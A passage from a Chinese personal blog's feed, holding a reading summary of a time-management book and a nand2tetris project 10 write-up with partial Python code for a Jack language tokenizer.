 <span class="comment">// down arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">130</span>) &#123; <span class="keyword">do</span> snake.moveLeft(); &#125;   <span class="comment">// left arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">132</span>) &#123; <span class="keyword">do</span> snake.moveRight(); &#125;   <span class="comment">// right arrow</span></span><br><span class="line">     &#125; <span class="comment">// while</span></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>build a computer</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>《为什么精英都是时间控》读后感</title>
    <url>/2022/01/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/6/</url>
    <content><![CDATA[<h3 id="《为什么精英都是时间控》读后感"><a href="#《为什么精英都是时间控》读后感" class="headerlink" title="《为什么精英都是时间控》读后感"></a>《为什么精英都是时间控》读后感</h3><p>最近大概花了大概也就4天左右的时间读完了《为什么精英都是时间控》这本所谓的畅销书，当然我不能说书的质量有多高，干活不多，毕竟畅销书的质量不能说有多好，只是觉得里面有几个观点还不错，顺手记录下来分享和回归以下。以前看过很多类似的学习方法之类的书籍，但是我感觉质量最高的还是之前加州大学某个分校的教授的课程质量真是高，有理论有实际，还有各种原因解释，之前很早写过一篇总结<a href="https://zhuanlan.zhihu.com/p/263920359">《how to learn》课程总结</a>, 还是需要再仔细回顾回顾，废话不多说，说点书中的干货。</p>
<h4 id="0-时间管理遵循的四个重要原则"><a href="#0-时间管理遵循的四个重要原则" class="headerlink" title="0. 时间管理遵循的四个重要原则"></a>0. 时间管理遵循的四个重要原则</h4><ul>
<li>以专注力为中心时间分配各项事项，在大脑专注力最好的情况下最需要专注力的工作，而不是任何时间都去做需要高度专注力的事情。</li>
<li>如何快速恢复和提升大脑的专注力，睡眠是提升专注力的特效药，注重劳逸集合，注重睡眠和大脑的休息放松，而不是一味的坚持和加班，实际上大脑的专注力下降时，工作的效率其实并不高，勉强进行高度专注力工作实际得不偿失。</li>
<li>提升工作效率，重要的手段是限定工作结束时间，一旦限定工作截止时间，从而造成紧迫感，强迫自己高度专注。</li>
<li>业余时间注重自我投资，注重放松和自我学习，通过放松让大脑得到休息，通过自我学习从而得到更多的提升。</li>
<li>保持心情舒畅，始终明白工作是为了生活更美好，而不是生活为了工作，注重工作和生活的平衡，注重维系家人和朋友的关系。</li>
</ul>
<h4 id="1-提升大脑专注力"><a href="#1-提升大脑专注力" class="headerlink" title="1. 提升大脑专注力"></a>1. 提升大脑专注力</h4><ul>
<li>书中明确提示了几个关键点信息，大脑有最长时间的专注时间，必须要注意劳逸结合，比如常见的人脑大概有会有最长 <code>90</code> 分钟的高度专注力，在专注力高的时候，此时从事脑力劳动会事半功倍，要注意学习和利用好这些黄金时间，而一旦大脑专注力下降，此时从事需要大量脑力劳动的工作就会效率下降，所以需要注意间隔的休息，只有这样才能提高效率，提升大脑专注力的最重要的是要注意劳逸结合和间隔休息，一般从事高脑力劳动时需要间隔<code>45</code>分钟左右休息。</li>
<li>排除杂念：整理外物与周围的环境，做事情之前提前把目标和截止时间写出来，因为思考过程容易带来思维的打断，当然也可以说是因为人类天生大脑结构就避免思考，因为思考需要耗费大量的能量，所以在做事情之前就把结果和所有的步骤想清楚，然后写下来，这样在做事情的时候按照自己提前书写的步骤来执行即可，因为这样可以避免思考，从而提升效率。在高效率的工作时需要一个具有高效率工作的环境，避免外界的干扰，比如我们尽量不要在家里或者卧室里面工作，对于重要的工作应该去图书馆、咖啡厅或者办公室、会议室这些能够让自己集中精力的地方，尽量关闭手机，避免外界的通话或者即时通讯软件造成的干扰。专心工作时，其实也尽量避免听音乐，因为听音乐会给自己带来一定的干扰。</li>
<li>严格限定时间。许多时候因为工作没有强制限定时间，从而导致自己没有紧迫性，不注重提高工作效率，因此我们应该对于任何工作应当尽快制定限定时间，只有这样才能让自己有紧迫感，人在一定的紧迫感和紧张感的作用下专注力就会高度集中，从而提升自己的专注力和工作效率。因此在制作<code>to do list</code> 时，尝试加入截止时间。 许多工作任务就是因为没有截止时间，从而导致自己没有拖沓，比如加班的习惯就不好，潜意识里工作干不完加班即可解决，从而导致正常的八个小时内效率不高，幻想着拖沓，反而欧美企业注重工作效率，晚上时间更加放松。</li>
</ul>
<h4 id="2-上午充分利用大脑黄金时间"><a href="#2-上午充分利用大脑黄金时间" class="headerlink" title="2. 上午充分利用大脑黄金时间"></a>2. 上午充分利用大脑黄金时间</h4><ul>
<li>充分利用早晨的时间。对于专注性工作应该尽量放在上午完成，因为大脑在醒来的前个小时内是专注力最高的，俗话说早上<code>30</code>分钟的高效工作可以抵上夜间<code>2</code>个小时,当然根据自己的经验来说确实如此，早上的工作时间更加高效，大脑更加清晰，反而在晚上<code>9</code>点 到 <code>11</code>之间这时工作效率是最低的，感觉这个时间段适合干一些不太需要专注力的工作，比如可以看看视频、看看有意思的书籍，写写读后感，而不适合用来刷题或者专注写作这些需要高度专注的工作。</li>
<li>要充分利用早上的黄金时间，抓紧时间吃早饭、洗漱这种不重要的工作，快速的进入专注状态，而不是懒散的松弛状态。</li>
<li>早上大脑更清醒的方法：<ul>
<li>早上淋浴，提高体温，从而提升神经的敏感度，从而加速自己进入清醒状态；</li>
<li>开着窗户睡觉：阳光照射身体，从而分泌更多的血清素，从而让大脑进入兴奋状态；</li>
<li>早上醒来后，尽量避免睡回头觉：醒来之后可以发会呆思考一下，但是一定不要再继续深睡下去，否则会导致大脑不清醒；</li>
<li>有节奏的运动：早上醒来后可以适当的运动，接受阳光照射，加速血夜循环，适合的运动有慢跑和散步；</li>
<li>细嚼慢咽吃一顿丰富的早餐：通过咀嚼可以让大脑分泌血清素。吃早餐可以提供丰富的能量，有助于提升血糖。</li>
<li>早晨尽量避免的事情：看手机、刷视频、听新闻，这样的会让大脑堆满垃圾信息，从而让大脑的专注力下降，应该保持一个放空的状态去工作。可以利用早上的时间做一下<code>to do list</code>，把今天的工作安排做好。</li>
</ul>
</li>
</ul>
<h4 id="3-下午如何让大脑重回巅峰状态"><a href="#3-下午如何让大脑重回巅峰状态" class="headerlink" title="3. 下午如何让大脑重回巅峰状态"></a>3. 下午如何让大脑重回巅峰状态</h4><p>早上是大脑的黄金时间，下午时大脑专注力会逐渐下降，此时如何让大脑重回巅峰的工作状态：</p>
<ul>
<li>中午外出午餐：外出午餐带来环境的改变，能够提升人的愉悦感，从而提升工作效率，外出可以晒太阳从而让大脑分泌更多的血清素，到陌生的地方行走，可以让自己感到新鲜感，从而提升自身的愉悦感。</li>
<li>中午适当午休：最佳的午休时间为 <code>1</code> 点到 <code>2</code> 点之间，午休时间最佳为<code>20~30</code> 分钟，通过午休让大脑得到充分放松，可以盖上注意力，最佳时间为 <code>26</code> 分钟，午休时间不要超过<code>30</code>分钟，否则大脑会进入深度睡眠，由于从深度睡眠切入到清醒状态需要一定的时间，因此会导致大脑不清醒并且会影响身体健康。午休最好是躺在床上或者在会议室均可，找一个安静的地方入睡。可以极大的提升效率，改善工作质量。</li>
<li>下午的重启：通过运动来盖上，穿插休息。下午时大脑容易疲劳，此时可以稍微在工作间隙中进行短暂休息即可，从而让大脑快速的得到恢复，最不好的休息方法是看手机玩手机游戏或者看视频，容易让人沉迷且大脑实际得不到休息。也可以采用喝茶或者听听轻音乐、冥想等简单的方法来进行放松。</li>
<li>下午要提前确认工作结束的时间和离开办公室的时间。因为只有这样才能让自身有紧迫感，才能提高自身的工作效率。</li>
</ul>
<h4 id="4-晚上如何利用运动与睡眠"><a href="#4-晚上如何利用运动与睡眠" class="headerlink" title="4. 晚上如何利用运动与睡眠"></a>4. 晚上如何利用运动与睡眠</h4><p>通过运动和睡眠让大脑得到重启，通过运动让大脑得到重启，通过睡眠让大脑得到充分休息。</p>
<ul>
<li>运动重启大脑：通过运动让大脑得到放松，坚持做有氧运动，有氧运动会促进身体分泌多巴胺，多巴胺从而让人体得到放松和愉悦。通过运动让人神清气爽，特别是有氧运动，加速血液循环，人的大脑在运动之后也会变得思维更加快捷。每天晚上坚持<code>30</code>分钟的有氧运动，人的学习能力、记忆力积极性都会得到大幅度提高，长期的运动可以促进神经元之间的联系，让头脑变得更聪明。确保每周保持<code>4~5</code>次的运动，但是需要注意的是运动时间要安排在晚上9点之前完成，否则运动过后大脑容易出现兴奋状态反而不利于晚上睡眠。</li>
<li>高质量的睡眠：一旦离开工作岗位就尽量避免再想工作上的烦心事，尽量脱离工作中烦恼，让自己心情放松。睡眠前<code>2</code>个小时尽量避免刺激大脑的活动，让大脑进入放松状态，避免晚上吃宵夜和饮食而破坏睡眠。睡眠时间控制在<code>7~9</code>个小时之间，不要超过<code>9</code>个小时，睡眠过多反而对身体有伤害。注重高质量的睡眠。税前<code>15</code>分钟可以利用，黄金记忆时间可以回顾一下今天发生的事情以及学习的内容，能够加深印象，记忆深刻。</li>
<li>早上早起，尽量在<code>7</code>点之前起床，避免周末补觉，实际是得不偿失，身体状态没有调整到最优。过多的睡眠只能恢复身体的疲劳，但不是补偿大脑的机能，所以大脑的专注力并没有恢复。平时需要注重作息规律，工作规律，才能更好的利用好时间，提高工作效率。</li>
<li>周末要注重运动，越是疲惫的时候越是容易通过运动恢复身体，注重互补休息法，平时脑力劳动多的人士周末应当最好去户外运动，平时体力劳动多的人士周末可以在家进行放松，避免酗酒等恶习。</li>
<li>注重每天的规律作息。每天尽量按照自己固定的作息计划来开启自己每天的生活，在同一时间起床，在同一时间睡觉，重复的作息规律能够让有助于发挥大脑和身体的最佳机能。根据脑科学的原理最完美的作息安排如下：<table>
<thead>
<tr>
<th align="center">时间</th>
<th align="center">安排</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">7:00-9:00</td>
<td align="center">自我投资、自我学习</td>
<td align="center">大脑的黄金时间</td>
</tr>
<tr>
<td align="center">9:00-12:00</td>
<td align="center">专注时间</td>
<td align="center">罐头工作术</td>
</tr>
<tr>
<td align="center">12:00-13:00</td>
<td align="center">吃午餐</td>
<td align="center">分泌血清素</td>
</tr>
<tr>
<td align="center">13:00-16:00</td>
<td align="center">非专注性工作、间隔小睡、间隔变换场所</td>
<td align="center">整体重启</td>
</tr>
<tr>
<td align="center">16:00-18:00</td>
<td align="center">工作最后冲刺</td>
<td align="center">去甲肾上腺素</td>
</tr>
<tr>
<td align="center">18:00-19:00</td>
<td align="center">运动时间</td>
<td align="center">大脑重启</td>
</tr>
<tr>
<td align="center">19:00-21:00</td>
<td align="center">自我投资</td>
<td align="center">大脑的第二个黄金时间</td>
</tr>
<tr>
<td align="center">21:00-23:00</td>
<td align="center">放松时间</td>
<td align="center">后叶催产素</td>
</tr>
<tr>
<td align="center">23:00-7:00</td>
<td align="center">7个小时以上的睡眠时间</td>
<td align="center">褪黑激素</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="5-如何利用高效利用工作时间"><a href="#5-如何利用高效利用工作时间" class="headerlink" title="5. 如何利用高效利用工作时间"></a>5. 如何利用高效利用工作时间</h4><ul>
<li><p><code>for you</code>工作术：为别人着想的工作术，因为只有这样才能逼迫自己提高时间和效率。珍惜自己的时间就是珍惜别人的时间，不让别人等待，守时守约，避免迟到，避免让他人等待，提前<code>30</code>分钟行动。</p>
</li>
<li><p>趁现在工作术: 当在工作时如果发现手上的工作可以在两分钟内解决和完成的话，应当立即着手完成这些工作而不是将其拖到最后。立刻完成的工作就应该马上着手，拒绝拖延提高工作效率才是关键。暂时无法判断的时候，可以留给日后进行决断。有重要的事情应当立马确定时间，把握现在的关键时机。</p>
</li>
<li><p>并行工作术：并行工作术可以在互不影响的情况下并行工作。并不是说同时干<code>a</code>与<code>b</code>的工作，而是说在<code>a</code>进行等待的实际可以抽空干<code>b</code>，这样在互不干扰的情况下可以得到更高的效率，在坐地铁的同时可以看书学习，在泡澡、喝咖啡的同时可以看书。读书和学习之后要有输出，通过记录<code>3</code>个重要的点来总结读书内容，可将读后感发表在社交网络上，从而加深自己对读书的印象。结合自己来说，之前爱写读后感，现在确实缺少时间来撰写读后感。</p>
</li>
<li><p>学会用耳学和思考：耳学即可以通过声音来进行学习，这样可以并行工作。闲暇时间也要多思考，反而在大脑放空的时候进行思考更容易产生灵感，可以利用散步和泡澡的时间来进行细致的思考。</p>
</li>
</ul>
<h4 id="6-如何高效的利用自由时间"><a href="#6-如何高效的利用自由时间" class="headerlink" title="6.如何高效的利用自由时间"></a>6.如何高效的利用自由时间</h4><ul>
<li><p><strong>自由时间不要用于工作</strong>：工作不应追求量，应追求质。真正厉害的高手都去解决很难或者很有挑战性的工作，平庸的问题或者平庸的工作只追求量的话对自身来说并没有很大的提升。一旦将自由时间也投入工作的话，那么工作时间将会无限增加。我们作为成年人，应当珍惜时间的宝贵，应当最大限度的提高工作效率，将工作效率提升<code>3</code>倍以上，这样我们才能增加自己的自由时间，自由时间越多，用来投资自己的时间也越多，而这样人生就会感到越自由。</p>
</li>
<li><p><strong>投资自己</strong>：在业余时间投资自己的专长，因为只有投资自己的专长才能锻炼自己的技能，提升自己的工作能力，从而可以提升自己的工作效率，这样就达到了一个正循环，从而让自己拥有更多的自由时间。同时我们还应该利用自由时间投资一些通用的机能，比如英语阅读书写能力、写作能力、交流能力等等基础能力。</p>
</li>
<li><p><strong>选择主动性娱乐</strong>: 主动娱乐即为阅读、体育运动、智力游戏等需要自身投入专注力的娱乐，而看电视、玩手机、刷短视频等为被动娱乐，在被动娱乐下大脑可能不需要进行思考，只需要被动接受信息即可，被动性娱乐容易分散注意力，长期来看对大脑的能力有所损害。</p>
</li>
<li><p><strong>主动学会享受自由时间</strong>：要学会主动享受自由时间，白天努力工作，晚上应当注重娱乐与放松、恢复精力等活动。在自由时间也注重发挥出百分之百的专注力，通常在工作中也能发挥出百分之百的专注力。</p>
</li>
<li><p><strong>内心要学会主动享受快乐</strong>：要树立人生活着就是为了快乐的信念而不是工作狂的信念，只有内心快乐，外在的生活才能真正的享受快乐。</p>
</li>
<li><p>学会制作玩乐的<code>to do list</code>：应当将玩乐也放入到自己的生活中计划的一部分，只有这样才能心情保持愉悦。因为这是对自己努力工作的奖励，这样带着激励反而更能激发出高效的工作效率。</p>
</li>
</ul>
<div style="text-align: center">
  <div class="github-card"
    data-user="mike-box"
    data-repo="coursera"
    data-height="200"
    data-width="400"
    data-theme="default"
    data-target=""
    data-client-id=""
    data-client-secret=""
  ></div>
</div>
<script src="/github-card-lib/githubcard.js"></script>
 <div style="text-align: center">
  <div class="github-card"
    data-user="mike-box"
    data-repo="coursera"
    data-height="200"
    data-width="400"
    data-theme="default"
    data-target=""
    data-client-id=""
    data-client-secret=""
  ></div>
</div>
<script src="/github-card-lib/githubcard.js"></script>



<h4 id="7-后记"><a href="#7-后记" class="headerlink" title="7.后记"></a>7.后记</h4><p>  本书作者为一名自由作家撰写，作者原本的职业是一名神经内科医生。在日本以勤奋工作的氛围下，作者经历过严重的加班，<code>996</code>等工作机制，在一段时间内作者陷入了痛苦的怪圈，繁忙的工作让他喘不过气来。作者在<code>40</code>岁左右时意外得到了一个到国外去留学的机会，在美国留学期间，他看到了国外人不一样的工作模式，让他倍感启发，从发誓要摆脱过过去那种让他窒息的工作模式。作者尝试去建立一种比较科学的工作模式，首先他尝试摆脱了内科医生这个职业，转向自由职业。自己开始规划自己的时间，让自己的工作效率更加高效，通过自由创作、<code>up</code>主等方式获得了谋生的方式，更为重要的是作者可以自由安排自己的时间了，通过自己的摸索而建立了一套高效率时间管理的体系，让自己的生活更加美好。通过阅读确实书中有不少思路可以借鉴，特别是如何高效的安排时间方面有许多值得借鉴的地方，当然自己也尝试在业余记录一些东西，做一些自己感兴趣的方向，通过规律的作息、定期运动、高效的规划时间确实让自己的生活感到更美好了。</p>
<ul>
<li><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>读书感想</category>
      </categories>
      <tags>
        <tag>读书感想</tag>
      </tags>
  </entry>
  <entry>
    <title>【build a computer】 project 10</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/80/</url>
    <content><![CDATA[<h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难，<code>build a computer</code>的<code>part II</code>部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满。特别是只剩下后面三章了，主要是完成一个<code>jack</code>语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。<code>project10</code>主要完成<code>jack</code>语言编译器的语法分析，感觉还是非常有难度和挑战的，花了差不多两周时间，利用子集的业余时间终于把蹩脚的语法解析器完成了，主要是关于<code>jack</code>语言的语法分析。收获满满，最终的实现结果是将<code>jack</code>语言的语法分析结果结构化为固定的<code>xml</code>文档，供后面的代码生成器和链接器使用。当然总体来说<code>jack</code>语言的语法还是非常简单的语法，我们直接用常见的<code>top down</code>递归下降分析法即可实现，实际是非常简单的语法，至少感觉总体语法来说比<code>c</code>语言的语法简单多了，非常喜欢这类有挑战性的小<code>project</code>，感觉对基本的递归方法有了更深层次的了解。</p>
<ul>
<li><code>Lexical elements</code>: 词的定义，在<code>jack</code>语言中词的定义非常简单，只有5类基本类型，如下所示：</li>
</ul>
<p><img src="https://i.loli.net/2020/12/10/8ysJVnjkYBwFfZr.png" alt="1"><br>关键字、符号、整数常数、字符串常数、普通标识符。</p>
<ul>
<li><ul>
<li>关键字即可语法中的关键字，不可随意使用</li>
</ul>
</li>
<li><ul>
<li>特殊符号即为过程标志位和运算符</li>
</ul>
</li>
<li><ul>
<li>整数常数 (0~32767)</li>
</ul>
</li>
<li><ul>
<li>字符串常数 (“xxx”)</li>
</ul>
</li>
<li><ul>
<li>普通标识符</li>
</ul>
</li>
<li><p><code>Program structure</code>:结构语法，包含基本的程序结构定义</p>
</li>
</ul>
<p><img src="https://i.loli.net/2020/12/10/3ApEQqrJysU8Goi.png" alt="2"></p>
<ul>
<li><code>Statements</code>：语句定义，还是非常常见的语句定义</li>
</ul>
<p><img src="https://i.loli.net/2020/12/10/QTFPaLnK9RoevUq.png" alt="3"></p>
<ul>
<li><code>Expressions</code>:表达式定义，包含常见的表达式定义:</li>
</ul>
<p><img src="https://i.loli.net/2020/12/10/VcQwuEijCeAaMgy.png"><br>整个<code>project</code>基本围绕着上述几个语法展开，实际还是非常有意思的，需要对递归非常熟悉才可以对整个代码比较好的掌握</p>
<h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>还是非常有难度的<code>project</code>，刚开始准备用<code>c++</code>来实现，后来发现<code>c++</code>太恶心了点，最后用蹩脚的<code>python</code>花了大概一个星期终于实现了整个<code>project</code>，整个程序的流程也分为两部分，先将整个程序进行<code>token</code>格式化，后续的分析引擎对整个语法树进行分析，生成树状结构的<code>xml</code>文件，当然总的来说本章的<code>project</code>有难度，但是不够有趣，感觉<code>csapp</code>的<code>project</code>难度非常大，不是一般人能够坚持完成的，目前的打算是准备把<code>build a computer</code>这个系列的课程的<code>project</code>代码完整的实现一遍，终于磨蹭了这么长时间只剩下最后两个<code>project</code>了。源代码放在<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/10">poj10</a>.</p>
<ul>
<li><code>token parser</code>：整个程序非常简单，其实大概核心的代码<code>100</code>行即可完成<code>token</code>解析，非常简单的代码逻辑即可实现。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TOKEN_TYPE</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    TOKEN_KEYWORD = <span class="number">0</span></span><br><span class="line">    TOKEN_SYMBOL = <span class="number">1</span></span><br><span class="line">    TOKEN_IDENTIFIER = <span class="number">2</span></span><br><span class="line">    TOKEN_INT_CONST = <span class="number">3</span></span><br><span class="line">    TOKEN_STRING_CONST = <span class="number">4</span></span><br><span class="line">    TOKEN_INVALID = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KEYWORD_TYPE</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    KEYWORD_CLASS = <span class="number">101</span></span><br><span class="line">    KEYWORD_METHOD = <span class="number">102</span></span><br><span class="line">    KEYWORD_FUNCTION = <span class="number">103</span></span><br><span class="line">    KEYWORD_CONSTRUCTOR = <span class="number">104</span></span><br><span class="line">    KEYWORD_BOOLEAN = <span class="number">105</span></span><br><span class="line">    KEYWORD_CHAR = <span class="number">106</span></span><br><span class="line">    KEYWORD_VOID = <span class="number">107</span></span><br><span class="line">    KEYWORD_VAR = <span class="number">108</span></span><br><span class="line">    KEYWORD_STATIC = <span class="number">109</span></span><br><span class="line">    KEYWORD_FIELD = <span class="number">110</span></span><br><span class="line">    KEYWORD_LET = <span class="number">111</span></span><br><span class="line">    KEYWORD_DO = <span class="number">112</span></span><br><span class="line">    KEYWORD_IF = <span class="number">113</span></span><br><span class="line">    KEYWORD_WHILE = <span class="number">114</span></span><br><span class="line">    KEYWORD_RETURN = <span class="number">115</span></span><br><span class="line">    KEYWORD_TRUE = <span class="number">116</span></span><br><span class="line">    KEYWORD_FALSE = <span class="number">117</span></span><br><span class="line">    KEYWORD_NULL = <span class="number">118</span></span><br><span class="line">    KEYWORD_THIS = <span class="number">119</span></span><br><span class="line">    KEYWORD_VALID = <span class="number">120</span></span><br><span class="line"></span><br><span class="line">keywordname = [<span class="string">&quot;class&quot;</span>,<span class="string">&quot;method&quot;</span>,<span class="string">&quot;function&quot;</span>,<span class="string">&quot;constructor&quot;</span>,<span class="string">&quot;boolean&quot;</span>,<span class="string">&quot;char&quot;</span>,<span class="string">&quot;void&quot;</span>,<span class="string">&quot;var&quot;</span>,<span class="string">&quot;static&quot;</span></span><br><span class="line">               ,<span class="string">&quot;field&quot;</span>,<span class="string">&quot;let&quot;</span>,<span class="string">&quot;do&quot;</span>,<span class="string">&quot;if&quot;</span>,<span class="string">&quot;else&quot;</span>,<span class="string">&quot;while&quot;</span>,<span class="string">&quot;return&quot;</span>,<span class="string">&quot;true&quot;</span>,<span class="string">&quot;false&quot;</span>,<span class="string">&quot;null&quot;</span>,<span class="string">&quot;this&quot;</span>]</span><br><span class="line">keywordtype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> KEYWORD_TYPE.__members__.items()]</span><br><span class="line">keworddict = <span class="built_in">dict</span>(<span class="built_in">zip</span>(keywordname,keywordtype))</span><br><span class="line">tokenname = [<span class="string">&quot;keyword&quot;</span>,<span class="string">&quot;symbol&quot;</span>,<span class="string">&quot;identifier&quot;</span>,<span class="string">&quot;integerConstant&quot;</span>,<span class="string">&quot;stringConstant&quot;</span>]</span><br><span class="line">tokentype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> TOKEN_TYPE.__members__.items()]</span><br><span class="line">tokendict = <span class="built_in">dict</span>(<span class="built_in">zip</span>(tokentype,tokenname))</span><br><span class="line">symboldict = <span class="built_in">set</span>([<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validNum</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(val) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> val[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(val) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> val:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c) &lt; <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(c) &gt; <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isAlpha</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(val) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(val) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(val) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(val) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isDigit</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(val) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(val) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validIdentifiers</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (val[<span class="number">0</span>] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> isAlpha(val[<span class="number">0</span>])):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(val)):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (val[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> isAlpha(val[i]) <span class="keyword">or</span> isDigit(val[i])):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JackTokenizer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,infile</span>):</span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.curr = <span class="number">0</span></span><br><span class="line">        self.buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(infile,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> ifs:</span><br><span class="line">           self.buffer = ifs.read()</span><br><span class="line">        ifs.close()</span><br><span class="line">        self.end = <span class="built_in">len</span>(self.buffer)</span><br><span class="line">        self.tokens = []</span><br><span class="line">        self.linenum = []</span><br><span class="line">        self.parseToken()</span><br><span class="line">        self.outfile = infile[:infile.find(<span class="string">&quot;.jack&quot;</span>)] + <span class="string">&quot;T.xml&quot;</span></span><br><span class="line">        self.genToken()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseToken</span>(<span class="params">self</span>):</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pos &lt; self.end:</span><br><span class="line">            <span class="comment">#we will skip space</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> (self.buffer[pos] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">            <span 